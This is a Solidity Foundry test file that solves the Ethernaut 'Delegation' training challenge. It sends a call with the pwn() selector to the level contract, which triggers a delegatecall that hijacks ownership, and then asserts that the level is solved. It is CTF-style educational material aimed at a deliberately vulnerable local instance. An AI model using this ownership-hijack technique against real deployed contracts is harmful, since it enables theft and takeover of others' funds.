pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import "src/core/Ethernaut.sol";
import "src/levels/06Delegation/Delegation.sol";
import "src/levels/06Delegation/DelegationFactory.sol";

contract TestDelegation is Test{
    Ethernaut ethernaut = new Ethernaut();
    address myEoaAddress = 0xB5Da00630Ca5fdE4d9cED2fcdA0C607cE198F159;
    function setUp() public {
        vm.deal(myEoaAddress, 1000 ether);
    }

    function testDelegation() public{
        DelegationFactory delegationFactory = new DelegationFactory();
        ethernaut.registerLevel(delegationFactory);
        vm.startPrank(myEoaAddress);
        address instanceAddress = ethernaut.createLevelInstance(delegationFactory);
        Delegation instance = Delegation(payable(instanceAddress));

        (bool success,) = payable(instanceAddress).call(abi.encodeWithSignature("pwn()"));

        vm.stopPrank();
        bool result = delegationFactory.validateInstance(payable(instanceAddress), myEoaAddress);
        assertTrue(result);

    }

}